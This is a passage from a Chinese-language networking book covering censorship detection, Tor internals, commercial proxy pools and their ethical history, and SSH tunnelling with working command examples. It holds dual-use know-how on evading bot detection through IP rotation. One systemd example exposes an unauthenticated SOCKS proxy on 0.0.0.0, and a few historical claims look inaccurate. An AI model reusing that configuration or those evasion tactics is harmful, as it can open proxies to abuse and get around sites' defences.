SNI 白名單從福建泉州起，逐步推廣到其他省份。2025 年底已是中國移動全網部署。中國電信、中國聯通跟進中。

為什麼這個事件很關鍵

SNI 白名單是 GFW 從「黑名單封鎖」轉向「白名單放行」的根本範式轉移。意義：

  • 傳統黑名單：未被識別的就放行（攻方優勢）
  • 白名單：未被授權的就拒絕（守方優勢）
  • 從根本上提高了抗審查工具的設計難度

這就是為什麼 Reality 在 2024-2026 年快速主導市場 — 它是第一個從設計上就針對白名單機制的協定。

23.6 — ML 流量分類器：下一個對抗

SNI 白名單之後，下一個前線是 ML 流量分類器。學術界 2020+ 大量研究這個方向：

  • Packet timing fingerprinting：連線初期 packet 間隔的統計分佈識別協定
  • Packet size distribution：connection 內 packet 大小的分佈識別應用類型
  • Cross-layer RTT analysis（2024 paper）：對比 transport-level RTT 與 application-level RTT，識別 proxy 是否在中間（因為 proxy 引入額外延遲）
  • Direction asymmetry：上下行流量比例識別（web 瀏覽下行多、視訊通話雙向均衡）

2026 年的 GFW 雖未公開使用 ML 分類器，但學術界共識是已具備技術能力。一旦部署，Reality 的「靜態偽裝」（看起來像 TLS）就不夠了 — 需要「動態行為偽裝」（行為也像真實 TLS 連線）。

Spider Traffic System（cf. Ch.22 §22.6）正是 Reality 對這個方向的回應 — 不只連線開始像 TLS，後續行為也模擬真實使用者瀏覽。但更激進的對抗工具（如 trafmonetizer，學術界提案）尚未進入主流抗審查工具。

Chapter 24

Tor 與洋蔥路由

Tor 是隱私代理領域的活化石 — 2002 年首版至今 24 年，從美國海軍研究實驗室的軍事計畫發展為全球最重要的匿名網路。本章拆解 Tor 的三跳架構、洋蔥加密、Hidden Services，並追蹤 2025 年 Arti（Rust 重寫）的進度。

Tor（The Onion Router）的設計哲學與 Ch.22 的抗審查協定家族截然不同。Shadowsocks、Reality 等協定的目標是「讓 server 知道我但中間看不到」 — 它們仍是 client-server 架構，server 知道 client 的 IP 與目的地。Tor 的目標更激進：「連 server 都不知道 client 是誰」 — 透過三層中繼讓 client 與 destination 都看不到對方真實 IP。這是隱私保護而非單純抗審查。本章解構這個設計。

24.1 — 三跳模型的設計動機

Tor 的核心架構是 三跳 circuit：client → Guard → Middle → Exit → destination。每一跳由不同的志願者運行的 relay 組成。為什麼是三跳？

角色 知道 client? 知道上一跳 知道下一跳 知道 destination?
Client ✓（自己） — Guard ✓
Guard ✓ Client Middle ✗
Middle ✗ Guard Exit ✗
Exit ✗ Middle — ✓
Destination ✗ Exit（看到的來源 IP） — ✓（自己）
圖 24.1　Tor 三跳資訊隔離。沒有任何一個 relay 同時知道「client 是誰」與「destination 是什麼」 — 三層設計的核心安全性質。

關鍵性質：

  • Guard relay：知道 client 是誰，但不知道 destination；client 長期固定使用 2-3 個 guard（避免每次都隨機選會增加 attack surface）
  • Middle relay：什麼都不知道，純粹中繼，是「plausible deniability」的來源
  • Exit relay：知道 destination，但看不到 client；exit 處的流量可能被監聽（這是 Tor 安全模型的已知限制）

三跳是安全與效能的最小妥協 — 兩跳意味著 entry 與 exit 直接溝通，可被 timing 攻擊聯結；四跳以上不增加安全但顯著降低效能。Tor 學術論文 2004 年發表時就論證過三跳的最佳性。

24.2 — 洋蔥加密：層層剝開

「Onion Routing」這名字來自洋蔥加密 — 訊息被三層加密包裹，每個 relay 剝開一層後送給下一跳。

  Client 端建構：
    payload = "GET / HTTP/1.1 Host: example.com"
    msg₃ = encrypt(K_exit, payload + dest_addr)
    msg₂ = encrypt(K_middle, msg₃ + exit_addr)
    msg₁ = encrypt(K_guard, msg₂ + middle_addr)

    Client → Guard:
      Guard.decrypt(K_guard, msg₁)
      → 看到 middle_addr 與 msg₂
      → 把 msg₂ 送到 middle_addr

    Guard → Middle:
      Middle.decrypt(K_middle, msg₂)
      → 看到 exit_addr 與 msg₃
      → 把 msg₃ 送到 exit_addr

    Middle → Exit:
      Exit.decrypt(K_exit, msg₃)
      → 看到 dest_addr 與 payload
      → 把 payload 送到 dest_addr
圖 24.2　洋蔥加密的層層剝開。每一跳只能解開自己那層，看不見其他層的內容。

具體加密細節

Tor 使用 fixed-size cells（固定大小封包，512 bytes 或 514 bytes）作為基本傳輸單位。固定大小是設計決策而非偶然 — 防止 packet size 流量分析。Cell 在三層 relay 上分別使用 AES-CTR 加密，加密金鑰透過 Tor 自己的握手協定（從 TAP → ntor → ntor v3 演進）建立。

Tor circuit 建立流程：

  1. Client 從 Tor 共識文件（consensus directory）取得 relay 列表
  2. Client 選 3 個 relay 組成 circuit
  3. Client 與 Guard 做 ntor 握手，建立 K_guard
  4. 透過已建立的 Guard 連線，與 Middle 做握手（讓 Guard 看不到內容），建立 K_middle
  5. 透過已建立的 Guard + Middle 連線，與 Exit 做握手，建立 K_exit
  6. Circuit 建立完成，可以送資料

整個過程約 1-3 秒（取決於 relay 地理位置）。Tor 每 10 分鐘自動重建新 circuit，輪替使用以提高匿名度。

24.3 — Hidden Services 與 .onion v3

除了「透過 Tor 訪問外部網站」，Tor 還支援「純粹在 Tor 網路內運行的服務」 — Hidden Services（也稱 Onion Services）。這類服務的位址是 .onion 域名，沒有 IP，只在 Tor 網路內可達。

v2（已棄用）vs v3

  • v2 .onion（2004-2021）：16 字元域名（如 3g2upl4pq6kufc4m.onion），用 RSA-1024。已知有多個安全弱點，2021 年正式棄用
  • v3 .onion（2017+，rend-spec-v3）：56 字元域名，使用 Ed25519 + Curve25519 + SHA3。例如 DuckDuckGo 的 v3 onion 是 duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion

Hidden Service 的運作機制

v3 Hidden Service 的設計極為精妙：

  1. Service 註冊：Service 選 3 個 relay 作為 Introduction Points（IP），把這個列表加密後發布到 Tor 共識文件
  2. Client 查詢：Client 知道 .onion 域名，從共識文件取得 IP 列表
  3. Client 建立 Rendezvous Point（RP）：Client 隨機選一個 relay 作為 RP，並透過 IP 通知 Service 來這個 RP
  4. Service 連到 RP：Service 也連到 RP（透過自己的 3 跳 circuit）
  5. RP 中介通訊：之後 Client ↔ RP ↔ Service 雙向 6 跳通訊

關鍵性質：

  • Service 與 Client 互相不知道對方 IP（雙向匿名）
  • RP 不知道 client 與 service 的真實身分
  • 2017 v3 規範把所有元件都改用 Ed25519 與 SHA3，理論上可承受到 Web 量子電腦時代

Onion Services 在 2026 年的應用

  • 新聞媒體：BBC、紐約時報、Washington Post 都有官方 .onion 站，給審查國家記者與消息來源
  • SecureDrop：記者收吹哨者爆料的標準工具
  • Facebook Onion：facebookcorewwwi.onion（v2）→ v3 版本，從 2014 年起運行
  • 地下市場：暗網市場（與本書無關，但這是公眾對 .onion 的主要印象）
  • 個人網站：許多技術社群網站提供 .onion 鏡像

24.4 — Pluggable Transports：突破封鎖的橋接

Tor 的 relay 列表是公開的（共識文件），這是設計上的去中心化必要性，但也意味著抗審查國家可以直接 IP 封鎖所有 Tor relay。為應對這個問題，Tor Project 引入兩個機制：

Bridges（橋接）

Bridges 是不公開於共識文件的 entry node。Tor Project 透過 BridgeDB 服務發放 bridge 位址（透過 web、email、Telegram 等隨機分發）。但靜態 bridge 仍會逐漸被識別、enumeration 並封鎖。

Pluggable Transports

cf. Ch.23 §23.2。PT 在 bridge 之上加混淆，讓「Tor over bridge」流量看起來不像 Tor。2026 年的主流 PT：

PT偽裝目標主要部署國
obfs4隨機 byte stream俄羅斯、伊朗
meekHTTPS via CDN（domain fronting）2017+ 在多數 CDN 處被禁，仍勉強可用
snowflakeWebRTC（透過志願者瀏覽器代理）中國、伊朗（極難封鎖）
WebTunnel（2024）HTTPS WebSocket 真實網站新興 PT，部署於高審查國家

Snowflake：分散式志願者的妙設計

Snowflake（2019+）是 Tor 抗審查最有創意的設計之一：

  1. 志願者在瀏覽器安裝 Snowflake extension（或開啟 snowflake.torproject.org 頁面）
  2. 瀏覽器變成臨時的 WebRTC proxy
  3. 抗審查國家的 Tor 用戶透過 WebRTC 連到隨機志願者
  4. 志願者的瀏覽器把 WebRTC 流量轉發到 Tor 網路

為什麼難封鎖？

  • WebRTC 是 video chat、Google Meet 等大量使用的合法協定，封鎖會大量誤殺
  • Snowflake 志願者數量龐大且持續變化，無法用 IP 黑名單
  • 對 Snowflake 流量的識別需要 deep packet inspection，成本極高

24.5 — Tor Browser：反指紋的工程

Tor 的隱私不只在網路層，也在瀏覽器層。Tor Browser 是 Mozilla Firefox ESR 的修改版，加入大量反指紋技術：

  • JA3/JA4 統一：所有 Tor Browser 用戶的 TLS 指紋都一致（Firefox ESR + 固定 cipher 順序）
  • HTTP header 統一：User-Agent、Accept-Language 等都鎖定
  • Window size 固定增量：視窗大小僅以 200x100 為單位變化（不洩漏精確 screen 解析度）
  • Canvas API 加噪：JavaScript 的 canvas fingerprinting 結果被擾亂
  • WebGL 限制：禁用或返回統一結果
  • Font enumeration 限制：只報告系統預設字體
  • Time API 精度降低：performance.now() 從 nanosecond 降到 100ms 精度（防 timing attack）
  • JavaScript 默認嚴格模式（最高 security level 完全禁用 JS）

整體目標：讓所有 Tor Browser 用戶看起來像同一個用戶。這個設計哲學叫「fingerprinting resistance through uniformity」 — 不是讓你隱形，而是讓你變成「另一個一樣的人」。

24.6 — Arti：Tor in Rust（2025–2026 進展）

2020 年 Tor Project 啟動 Arti（Tor in Rust）— 對 22 歲的 C 實作做完全重寫。動機：

  • C Tor 程式碼累積 22 年的技術債，模組化差
  • 記憶體安全：團隊估計過去的 CVE 中至少一半在 Rust 下不會發生
  • 開發速度：Rust 的型別系統與 ecosystem 大幅提升開發效率

24.7 — Tor 的限制與威脅模型

誠實面對 Tor 的已知限制：

Exit relay 的流量可見

Exit relay 看到的是明文應用層流量（除非該流量自身是 HTTPS）。歷史上多次發生 exit relay 偷竊使用者憑證、注入廣告。使用 Tor 必須搭配 HTTPS，這也是為何 Tor Browser 預設啟用 HTTPS Everywhere（已在 2021 年棄用，整合進 Firefox）。

全球被動觀察者

Tor 設計時假設「沒有單一 attacker 能同時觀察 entry 與 exit 流量」。但 2026 年現實是：NSA 與部分國家級 attacker 確實具備這個能力。對流量做時序與大小相關性分析，能在統計上聯結 Tor entry 與 exit 流量。這稱為 traffic correlation attack。

應對方向：

  • Vanguards：固定使用 4 層中繼而非標準 3 層，提高 correlation 難度
  • WTF-PAD（wonky timing-fuzzing PAD）：增加 padding traffic 擾亂 timing
  • 這些都是實驗性，非標準 Tor 功能

Hidden Service 的 deanonymization 攻擊

多年來研究者發現多個讓 Hidden Service 真實 IP 洩漏的方法（如透過誤配置的 SSH banner、Apache mod_status、TLS 指紋與已知 IP 的對應）。Hidden Service 運維比一般 web server 嚴格得多 — 任何 metadata 洩漏都可能讓你的 IP 暴露。

使用 Tor 本身的可疑性

在大多數國家，使用 Tor 本身合法，但使用 Tor 這個行為會讓你被網路服務、政府、僱主特別關注。這是隱私的悖論 — 越想要隱私越顯眼。Tor over bridge + PT 能緩解，但不能完全消除。

本章要點

Tor 的三跳 circuit + 洋蔥加密實現「沒有任何單一 relay 知道完整路徑」。Hidden Services（v3 .onion，56 字元，Ed25519+SHA3）讓 Service 與 Client 雙向匿名。

  • Pluggable Transports（obfs4、meek、snowflake、WebTunnel 2024）對抗網路層封鎖；Snowflake 用 WebRTC + 志願者瀏覽器是最有創意的設計。Tor Browser 透過uniformity反指紋。
  • Arti（Rust 重寫）2025 年發展極為活躍，從 1.4 到 1.8 共 6 版，2026 年仍未完全取代 C Tor 但已能用作 SOCKS proxy。Tor 的根本限制：exit 流量可見、全球被動觀察者攻擊、hidden service deanonymization。

Chapter 25

代理池架構

代理池是商業爬蟲、SEO 工具、市場研究的基礎建設。本章解構商業代理池的三種 IP 來源（資料中心、住宅、行動）、輪替策略，以及 Hola/Bright Data 的倫理黑歷史 — 這個產業的 dirty secret。

代理池（Proxy Pool）這個詞涵蓋兩種完全不同的東西。在「合法的商業」語境，它是大規模分散式 proxy 基礎設施，提供給爬蟲、SEO 監測、廣告驗證等使用。在「灰色」語境，它與 Hola/Bright Data 案例綑綁，涉及把使用者裝置變成 botnet 出口節點的倫理問題。本章誠實面對兩面 — 既看技術，也看歷史。

25.1 — 三種 IP 類型

代理池業界把 IP 分三類：

類型來源價格（2026）偽裝度
Datacenter IPAWS、GCP、Azure、Linode 等雲端商$0.5–2/IP/月低（網站易識別為機器人）
Residential IP真實家庭寬頻（透過 ISP 配發）$5–15/GB高（看起來像真實使用者）
Mobile IP4G/5G 行動數據（透過 carrier）$15–50/GB極高（多個使用者共享，難以個別識別）

Datacenter IP

最便宜也最容易被識別。雲端 IP 區段（AWS、Azure、GCP 的 IP range）公開可查，網站只需查 ASN 即可判斷請求來自資料中心。Cloudflare 的 Bot Management、Akamai Bot Manager 都自動把 datacenter IP 標記為「likely bot」。

Residential IP

業界主力。看起來像真實家庭使用者，難以區分。但來源充滿倫理爭議（§25.4 詳述）。價格按流量計（GB），相當昂貴。

Mobile IP

最高品質的代理 IP。CGN（Carrier-Grade NAT）讓多個行動使用者共用同一公開 IP，網站封鎖一個 mobile IP 等於封鎖一片 carrier 用戶 — 風險太大，所以 mobile IP 幾乎永遠不會被列黑名單。代價是價格高昂與頻寬有限。

25.3 — 輪替策略

使用代理池的客戶端需要選擇輪替策略 — 何時換 IP？

Per-request 輪替

每個 HTTP 請求換一個新 IP。最強匿名度，但破壞網站的 session（cookie 需要從同一 IP 來，換 IP 等於登出）。適合無 session 的爬蟲（如商品價格抓取）。

Sticky session（黏性會話）

同一 client 在 N 分鐘內保持同一 IP（典型 10 分鐘）。適合需要登入的場景（電商價格爬取、社群媒體監控）。Bright Data 的「sticky session」與 Oxylabs 的「session control」都是這個機制。

地理輪替（Geo-targeting）

指定特定國家/城市的 IP。SEO 監測（同一搜尋在不同國家結果不同）、廣告驗證（廣告投放是否到達目標市場）的核心需求。商業代理池都支援精細的 geo-targeting，到城市級別。

ASN 輪替

避免同一 ASN（autonomous system）多次請求被識別為機器人。進階使用者會在數十個 ASN 之間輪替。

25.4 — Hola → Luminati → Bright Data：產業的 dirty secret

residential IP 的最大問題：這些 IP 從哪來？ 真實家庭寬頻不會主動把自己的 IP 賣給代理池廠商。Hola 的故事說明了業界的「灰色」來源。

2014：Luminati 誕生

Hola VPN 自 2008 年起運營，是免費 P2P VPN，宣稱讓使用者免費翻牆。實際機制：免費使用者的閒置頻寬會被路由其他使用者的流量。2014 年底 Hola 推出商業 SaaS 服務 Luminati — 把免費 Hola 使用者的 IP 包裝成 residential proxy 賣給企業客戶，每 GB $20。

2015：8chan 攻擊事件

2015 年 5 月，8chan 創辦人 Fredrick Brennan 公開指責 Hola — 他發現 8chan 被 DDoS 攻擊，攻擊源頭是 Luminati 網路（也就是 Hola 免費使用者的 IP）。Hola 創辦人 Ofer Vilenski 承認事實，但辯稱這在使用條款已寫明（雖然當時沒寫得很清楚）。

事件爆發後 Hola 修改 FAQ 加上更明顯的揭露。但商業模式沒改：免費使用者仍是 botnet 的出口節點，付費使用者則不會。

2017–2019：賣股權與重新命名

2017 年 Hola 把 Luminati 大部分股權賣給英國私募基金 EMK Capital，估值 $200M。2019 年最終交易價為 $125M 換 75.6% 股份（公司估值 $165M）。2020 年 Luminati 改名 Bright Data，試圖切割 Hola 的負面形象。

2021：Colin Shribman 訴訟

2021 年前 Luminati CTO Colin Shribman（Hola 共同創辦人 Derry Shribman 的兄弟）對 Bright Data 提起訴訟，指控公司「把整個網路當成 Trojan 木馬群」。訴訟持續多年（截至 2026 年仍在進行中）。

2026 年的現況

Hola 仍在運作（2026/03 的 VPN 評測網站仍把 Hola 列為「不推薦」）。Bright Data 是 SaaS 業界 Fortune 500 的合作夥伴，業務蒸蒸日上。但商業 residential proxy 整個產業仍依賴類似機制 — Hola 不是個案，是業界現實。

25.5 — SDK 中的 botnet：另一個來源

Hola 是「免費 VPN 換 IP」模式。另一個常見的來源是 SDK 嵌入：

  1. 代理池公司提供 SDK 給 app 開發者，付費讓開發者整合進自己的 app
  2. 使用者下載 app（如免費小遊戲、工具類 app）
  3. SDK 在背景把使用者的裝置變成代理出口節點
  4. 使用者通常不知情或在使用者協議中以模糊文字提及

典型廠商：

  • IPRoyal Pawns：使用者自願下載 Pawns app 換取小額金錢（每月幾美元），算是相對透明
  • Honeygain：類似模式
  • 但大量 SDK 廠商不揭露，使用者完全不知情

2024 年起多個 mobile app 商店（Google Play、Apple App Store）開始要求 app 揭露 proxy SDK 使用，但執行不一致。2026 年的真實情況：你下載的某個免費 utility app，可能正在把你的家用網路賣給商業客戶。

25.6 — 倫理光譜

在「使用代理池是否倫理」的問題上，沒有黑白答案。本書整理一個光譜：

場景倫理評估

SEO 公司用代理池檢查不同地區搜尋排名業界標準，但可能違反 Google ToS
競品價格監控（爬電商網站）法律灰區（取決於司法管轄區）

票務黃牛（Ticketmaster scalping）不倫理，多國已立法禁止

倫理問題還有另一面：當你使用 residential proxy 時，那個 IP 後面是某個真實家庭。如果你的爬蟲讓那個家庭的網路被列為「可疑」並被某些網站封鎖，你正把成本轉嫁給陌生人。這是 Hola/Bright Data 模式的根本倫理瑕疵。

25.7 — 工程角度的代理池選型

如果你的工程需求合法，需選型代理池，幾個實務考量：

  • 透明來源：選擇明確說明 IP 來源（如 NetNut 的 ISP-direct）的廠商，避免間接支持 Hola 模式
  • API 與工具：成熟廠商提供 SDK、輪替邏輯、session control、指紋偽造（合 puppeteer / playwright 整合）
  • SLA：commercial SLA 對企業使用至關重要，個人開發者用 free tier 即可
  • 合規認證：Bright Data 等大廠取得 SOC 2、GDPR 合規認證；中小廠商通常沒有
  • Bypass list：避免代理池被用於敏感網站（金融、醫療），多數廠商有強制 bypass 規則

個人開發者若只需偶爾翻牆訪問，用自己的 VPS 自建 SOCKS5 / Reality 比商業代理池便宜得多。代理池的價值在大規模、需要多 IP 輪替、需要 geo-targeting 等場景。

SSH 作為代理

SSH 不是專門的 proxy，但工程師日常用它做的代理工作可能比所有專門 proxy 加起來還多。本章拆解 SSH 三種 forwarding 模式、ProxyJump 多級跳板、sshuttle 偽 VPN、AutoSSH 維持隧道，與 SSH certificate authority 取代古老的 known_hosts 系統。

OpenSSH 是 1995 年 Tatu Ylönen 為對抗瑞典芬蘭 ISP 的密碼嗅探攻擊寫的工具。它的設計目標只是「加密的 telnet 替代品」 — 沒人想到三十年後 SSH 會成為運維工程師的瑞士刀，特別是在「代理流量」這個用例上。本章是 Part III 最實用的一章 — 你今天就能用上每一招。

26.1 — Local Forward（-L）：把遠端 service 投影到本地

最基本的 SSH 隧道。把 SSH server 端能訪問的某個服務「映射」到本地 port：

語法ssh -L [bind_address:]local_port:remote_host:remote_port user@ssh_server

# 範例：本地 5432 → 透過 bastion → 內網 db.internal:5432
$ ssh -L 5432:db.internal:5432 user@bastion.example.com

# 然後本地 psql 連到 localhost:5432 就連到了 db.internal
$ psql -h 127.0.0.1 -p 5432 -U dbuser mydb

運作機制：

  1. SSH client 在本地 5432 開 listener
  2. 有 client 連上 → 透過 SSH 加密通道送指令給 server「請替我連到 db.internal:5432」
  3. SSH server 連到 db.internal:5432
  4. 之後 client ↔ SSH client ↔（加密 SSH 通道）↔ SSH server ↔ db.internal 雙向中繼

關鍵性質：

  • SSH server 必須能訪問 remote_host（在範例中 bastion 必須能連到 db.internal）
  • 本地 listener 預設只 bind 127.0.0.1（其他機器連不到）— 加 0.0.0.0:5432:... 可開放但要小心安全
  • 連線是 stateful，SSH 中斷後 forward 也斷

典型場景：

  • 開發者本地連到生產環境的資料庫做 debug
  • 透過 bastion 訪問內網 admin UI（Kibana、Grafana 內網版）
  • 連到 K8s pod 的 service（搭配 kubectl port-forward 的替代）

26.2 — Remote Forward（-R）：把本地 service 投影到遠端

-R 是 -L 的反方向。讓 SSH server 端能訪問你本地的服務：

語法ssh -R [bind_address:]remote_port:local_host:local_port user@ssh_server

# 範例：把本地 dev server (localhost:3000) 暴露到 bastion 的 8080
$ ssh -R 8080:localhost:3000 user@bastion.example.com

# 然後 bastion 上 curl 127.0.0.1:8080 = 連到你本地的 :3000

典型場景：

  • 本地開發 demo：把本地開發中的 web app 暴露給雲端的 collaborator
  • NAT 穿透：你的本地機器在 NAT 後，但 SSH server 在公網 — 用 -R 讓公網 server 能訪問你
  • Reverse shell（紅藍隊測試）— 本書 Ch.67 會展開

注意：預設 SSH server 端的 listener 只 bind 127.0.0.1（其他機器連不到）。要從外部連需要 sshd_config 設 GatewayPorts yes。這是安全敏感的設定，不要隨便開。

26.3 — Dynamic Forward（-D）：本地 SOCKS5 server

cf. Ch.17 §17.3。-D 是工程師最愛的「臨時 VPN」：

$ ssh -D 1080 user@bastion.example.com

# 本地 :1080 開 SOCKS5 listener
# 任何 SOCKS5 client 連到 127.0.0.1:1080 → 透過 SSH 通道，由 bastion 出去
$ curl --socks5-hostname 127.0.0.1:1080 https://example.com

與 -L 的差別：-L 把固定的 remote_host:port 投影到本地；-D 在本地開 SOCKS5，動態由 client 指定要連哪裡。

典型場景：

  • 透過跳板機翻牆訪問 multiple 網站（不用為每個網站開 -L）
  • 用瀏覽器 + FoxyProxy 切換到 SOCKS5 代理瀏覽
  • 讓 Slack / VS Code remote 等支援 SOCKS5 的工具走代理

限制：

  • 只支援 TCP CONNECT（不支援 UDP ASSOCIATE 或 BIND）
  • 所有流量串列於單條 SSH 連線，並發效能差於專屬 SOCKS5 server
  • 沒有 access control，誰能連 127.0.0.1:1080 就能用

26.4 — ProxyJump（-J）：多級跳板的清爽寫法

OpenSSH 7.3+（2016 年發布）引入 -J / ProxyJump，取代古老的 ProxyCommand 寫法。意義：透過跳板機連到目標，但跳板機不需要把流量特別設定。

舊式 ProxyCommand（複雜）

# 過去要這樣寫
$ ssh -o ProxyCommand="ssh -W %h:%p user@bastion" user@target

# 或在 ~/.ssh/config 寫
Host target
    ProxyCommand ssh -W %h:%p user@bastion

新式 ProxyJump（清爽）

$ ssh -J user@bastion user@target

# 多級跳板（透過 hop1 → hop2 → hop3 連到 target）
$ ssh -J u@hop1,u@hop2,u@hop3 u@target

# ~/.ssh/config 寫法
Host target
    ProxyJump bastion

Host bastion target
    User myuser

多層 ProxyJump 在大型企業有真實應用 — 進入企業內網需經過 N 層 bastion，每層都有獨立認證，每層都有 audit log。-J u@hop1,u@hop2 一個指令搞定。

ProxyJump 的另一個優點：沒有資料在 bastion 上落地。Bastion 只是 TCP 中繼，看不到加密內容。古老的 SSH agent forwarding（-A）會把私鑰暴露在 bastion 記憶體，而 ProxyJump 不會。安全性顯著提升。

26.5 — sshuttle：偽 VPN

SSH 的 -D 開 SOCKS5 對支援 SOCKS5 的應用有效。但很多 app（特別是各種命令列工具、桌面 app）不支援 SOCKS5。sshuttle（apenwarr 開發，2010+）解決這個問題 — 用 SSH 模擬 VPN：

$ sshuttle -r user@bastion 10.0.0.0/8 192.168.0.0/16

# sshuttle 會：
# 1. SSH 到 bastion
# 2. 在 bastion 上跑一個 helper（用 ssh server 自己的 Python）
# 3. 在本地用 iptables/nfqueue 攔截到 10.x、192.x 的流量
# 4. 流量打包送透過 SSH 通道給 bastion，由 bastion 出去

關鍵性質：

  • 不需要在 bastion 安裝任何東西 — sshuttle 動態傳一個 Python script 上去執行
  • 透明代理 — 應用層完全感知不到，curl、wget、nc 等都可用
  • 只代理指定 subnet，其他流量直連（與 full VPN 差異）
  • 需要 root 權限（要動 iptables）
  • 支援 DNS 轉發（--dns）— 避免 DNS leak（cf. Ch.14）

sshuttle 不是真正的 VPN — 它仍是 TCP-based（不支援 UDP，除了 DNS）。但對大多數開發者使用情境足夠。

26.6 — AutoSSH：永不放棄的隧道

SSH 隧道有個常見痛點：網路抖動會斷線。AutoSSH（autossh 套件）是個 wrapper — 監控 SSH 連線健康，斷線自動重連：

基本用法$ autossh -M 0 -N -D 1080 user@bastion

# -M 0：關閉 autossh 自己的 monitor port，依賴 SSH 內建的 keep-alive
# -N：不執行命令，只開 forward
# -D 1080：動態 SOCKS5 forward

# 推薦的 SSH options
$ autossh -M 0 -N \
    -o "ServerAliveInterval=60" \
    -o "ServerAliveCountMax=3" \
    -o "ExitOnForwardFailure=yes" \
    -D 1080 user@bastion

進階用法 — 用 systemd 包裝成 service，開機自動啟動：

/etc/systemd/system/socks-tunnel.service[Unit]
Description=SSH SOCKS5 tunnel
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=tunneluser
ExecStart=/usr/bin/autossh -M 0 -N \
    -o "StrictHostKeyChecking=accept-new" \
    -o "ServerAliveInterval=60" \
    -o "ExitOnForwardFailure=yes" \
    -i /home/tunneluser/.ssh/tunnel_key \
    -D 0.0.0.0:1080 tunneluser@bastion.example.com
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target

啟用：systemctl enable --now socks-tunnel。從此你的伺服器永遠有一個本地 SOCKS5 listener，網路斷線會自動恢復。

26.7 — SSH Certificate Authority：取代古老的信任模型

傳統 SSH 用兩個古老檔案做信任：

  • ~/.ssh/known_hosts（client 端）：記錄 server 公鑰指紋
  • ~/.ssh/authorized_keys（server 端）：記錄哪些 client 公鑰能登入

這個系統有運維噩夢級的問題：

  • 新員工入職要把公鑰加到所有 server 的 authorized_keys（或寫複雜的 config management）
  • 員工離職要從所有 server 移除（很容易漏）
  • 新增 server 時所有 client 都要 accept 新的 host key（典型「Are you sure (yes/no)?」對話）
  • Server 換金鑰時所有 client 都會看到「someone might be doing something nasty」警告

OpenSSH 從 5.4 版（2010）起支援 SSH Certificate Authority，把 SSH 信任模型升級為類似 PKI 的中央化簽發：

運作原理

  1. 建立 CA 私鑰（一次性，妥善保管）
  2. 用 CA 簽發使用者憑證（給員工的私鑰加上 CA 簽名 → 可登入哪些 server）
  3. 用 CA 簽發主機憑證（給每個 server 的私鑰加上 CA 簽名 → 證明它確實是該 server）
  4. 所有 client 在 known_hosts 信任 CA（一次設定，永久有效）
  5. 所有 server 在 sshd_config 信任 CA
產生 CA 與簽發憑證# 1. 建立 CA
$ ssh-keygen -t ed25519 -f ssh-ca -C "My SSH CA"

# 2. 簽發 user 憑證（alice 能登入所有 server，30 天有效）
$ ssh-keygen -s ssh-ca \
    -I alice \
    -n alice,root \
    -V +30d \
    -z 1 \
    alice.pub
# 產出 alice-cert.pub

# 3. 簽發 host 憑證（給 server.example.com）
$ ssh-keygen -s ssh-ca \
    -I server.example.com \
    -h \
    -n server.example.com,server \
    -V +365d \
    /etc/ssh/ssh_host_ed25519_key.pub
# 產出 ssh_host_ed25519_key-cert.pub
Server 端設定（/etc/ssh/sshd_config）# 信任這個 CA 簽發的 user 憑證
TrustedUserCAKeys /etc/ssh/ssh-ca.pub

# 自己用 host 憑證認證
HostCertificate /etc/ssh/ssh_host_ed25519_key-cert.pub
Client 端設定（~/.ssh/known_hosts）# 信任這個 CA 簽發的所有 host 憑證
@cert-authority *.example.com ssh-ed25519 AAAA... My SSH CA

優勢

  • 新增 server 零客戶端設定：用 CA 簽 host cert 即可，無需通知 client
  • 員工離職立即失效：憑證有 30 天 TTL；離職員工的舊憑證自動過期。緊急情況用 CRL（Certificate Revocation List）
  • 無 known_hosts 噩夢：所有 server 都能被驗證，零警告
  • 細粒度授權：憑證可指定能登哪些 host、哪些 user、有效時間範圍
  • 稽核友善：每張憑證有 unique serial number，所有登入都能追溯到簽發紀錄

2026 年的大型科技公司（Facebook、Uber、Airbnb 等）都用 SSH CA 取代 known_hosts。Hashicorp Vault、Smallstep 等工具提供 SSH CA as a Service。個人 / 小團隊也應該考慮 — 設定一次後 SSH 體驗顯著改善。

讀完本章，你應該能用 SSH 解決 80% 的「我需要透過某台伺服器訪問」問題：
